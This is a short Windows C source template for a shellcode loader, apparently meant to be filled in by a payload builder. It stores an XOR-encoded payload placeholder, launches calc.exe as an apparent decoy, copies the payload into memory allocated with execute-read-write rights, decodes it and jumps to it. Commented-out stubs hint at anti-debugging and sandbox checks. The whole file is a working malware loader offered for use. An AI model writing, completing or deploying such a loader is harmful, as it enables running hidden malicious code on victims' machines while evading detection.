#include <windows.h>
#include <stdio.h>

__attribute__((section(".text"))) unsigned char msgbox_payload[] = "%SHELLCODE%";
void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);
    // int is_debugged = d();
    // int size = z();
    // char *hostname = h();
    // char *country = c();
    // printf("is_debugged: %d\n", is_debugged);
    // printf("hostname: %s\n", hostname);
    // printf("size: %d\n", size);
    // printf("country: %s\n", country);

    size_t ss = sizeof(msgbox_payload);

    
    // Allocating executable memory
    void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode into allocated memory
    memcpy(exec_mem, msgbox_payload, ss);

    // XORing shellcode
    for (size_t i = 0; i < ss; i++) {
        ((unsigned char*)exec_mem)[i] ^= %XOR_KEY%;
    }
    
    // jump on it
    ((void (*)())exec_mem)();
}

